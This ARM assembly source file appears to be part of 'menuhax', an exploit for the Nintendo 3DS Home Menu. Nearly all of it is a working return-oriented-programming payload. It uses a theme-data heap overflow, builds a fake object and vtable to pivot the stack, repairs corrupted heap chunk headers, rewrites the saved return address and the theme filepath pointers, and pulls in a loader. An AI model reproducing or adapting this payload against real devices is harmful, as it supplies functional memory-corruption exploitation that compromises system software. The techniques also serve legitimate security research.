.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#define THEMEDATA_NEWFILEPATHS_BASEADDR 0x0fff0200

_start:

ropstackstart:

@ Write the original value for r4, to the location used for loading r4 from on stack @ RET2MENU.
ROPMACRO_COPYWORD TARGETOVERWRITE_STACKADR, (ORIGINALOBJPTR_BASELOADADR+8)

@ The below adds the saved LR value on stack used during RET2MENU, with a certain value. This basically subtracts the saved LR so that a function which was previously only executed with the themehax state, gets executed again with the real state this time. Without this, this particular function never gets executed with normal state, which broke various things.
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (rop_ret2menu_stack_lrval - _start)) @ r0

.word POP_R1PC
.word TARGETOVERWRITE_STACKADR+0x20 @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the saved LR value on the stack which gets used during RET2MENU, to rop_ret2menu_stack_lrval.

.word POP_R0PC
rop_ret2menu_stack_lrval:
.word 0

.word POP_R1PC
#ifndef LOADOTHER_THEMEDATA

#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
.word 0xfffffff4
#else
.word 0xfffffff8
#endif

#else

@ In addition to what was described above, rerun the theme-loading code during RET2MENU with this.
#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
.word 0xfffffeac
#else
.word 0xffffffd4
#endif

#endif

.word ROP_ADDR0_TO_R1 @ r0 = rop_ret2menu_stack_lrval + <above r1 value>

.word POP_R1PC
.word (HEAPBUF + (rop_ret2menu_stack_newlrval - _start))

.word ROP_STR_R0TOR1 @ Write the above r0 value to rop_ret2menu_stack_newlrval.

.word POP_R0PC
.word TARGETOVERWRITE_STACKADR+0x20 @ r0

.word POP_R1PC
rop_ret2menu_stack_newlrval:
.word 0 @ r1

.word ROP_STR_R1TOR0 @ Write the new LR value to the stack.

@ Restore the heap freemem memchunk header following the buffer on the heap, to what it was prior to being overwritten @ buf overflow.
#ifdef FIXHEAPBUF
ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0x8), 0x0
ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0xc), 0x0

@ Write the below value to a heapctx state ptr, which would've been the addr value located there if the memchunk wasn't overwritten, after the memfree was done.
ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80+0x40002c + 0x3c + 0x4), (FIXHEAPBUF-0x58)

@ Write the below value to a freemem memchunk header ptr, which would've been the addr value located there if the memchunk wasn't overwritten(the one targeted in the buf overflow), after the memfree  was done.
#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x10+0xc)), 0x0
#else
ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x28+0xc)), 0x0
#endif
#endif

#ifdef LOADOTHER_THEMEDATA
@ Write value 0x0 to the value which will get popped into r6 @ RET2MENU ROP.
ROPMACRO_WRITEWORD TARGETOVERWRITE_STACKADR+0x8, 0x0

@ Copy the theme filepath strings to THEMEDATA_NEWFILEPATHS_BASEADDR.
CALLFUNC_NOSP MEMCPY, THEMEDATA_NEWFILEPATHS_BASEADDR, (HEAPBUF + ((filepath_theme_stringblkstart) - _start)), (filepath_theme_stringblkend - filepath_theme_stringblkstart), 0

@ Overwrite the string ptrs in Home Menu .data which are used for the theme extdata filepaths. Don't touch the BGM paths, since those don't get used for reading during theme-load anyway.
#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYRD, (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_shuffle_bodyrd - filepath_theme_stringblkstart))
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_THEMEMANAGE, (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_regular_thememanage - filepath_theme_stringblkstart))
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_BODYCACHE, (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_regular_bodycache - filepath_theme_stringblkstart))
#endif

//ROPMACRO_WRITEWORD (0x32e604+0x10), (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_regular_bgmcache - filepath_theme_stringblkstart))

#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE, (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_shuffle_thememanage - filepath_theme_stringblkstart))
#endif

#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_shuffle_bodycache - filepath_theme_stringblkstart))
#endif

//ROPMACRO_WRITEWORD (0x32e604+0x1c), (THEMEDATA_NEWFILEPATHS_BASEADDR + (filepath_theme_shuffle_bgmcache - filepath_theme_stringblkstart))
#endif

#include "menuhax_loader.s"

@ The ROP used for RET2MENU starts here.

ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

#ifdef LOADOTHER_THEMEDATA
filepath_theme_stringblkstart:
@ Originally these strings used the "sd:/" archive opened by the below ROP, but that's rather pointless since the BGM gets read from the normal extdata path anyway.

#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
filepath_theme_shuffle_bodyrd:
.string16 "theme:/yodyCache_rd.bin"
.align 2
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
filepath_theme_regular_thememanage:
.string16 "theme:/yhemeManage.bin"
.align 2
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
filepath_theme_regular_bodycache:
.string16 "theme:/yodyCache.bin"
.align 2
#endif

/*filepath_theme_regular_bgmcache:
.string16 "sd:/BgmCache.bin"
.align 2*/

#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
filepath_theme_shuffle_thememanage:
.string16 "theme:/yhemeManage_%02d.bin"
.align 2
#endif

#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
filepath_theme_shuffle_bodycache:
.string16 "theme:/yodyCache_%02d.bin"
.align 2
#endif

/*filepath_theme_shuffle_bgmcache:
.string16 "sd:/BgmCache_%02d.bin"
.align 2*/

filepath_theme_stringblkend:
#endif

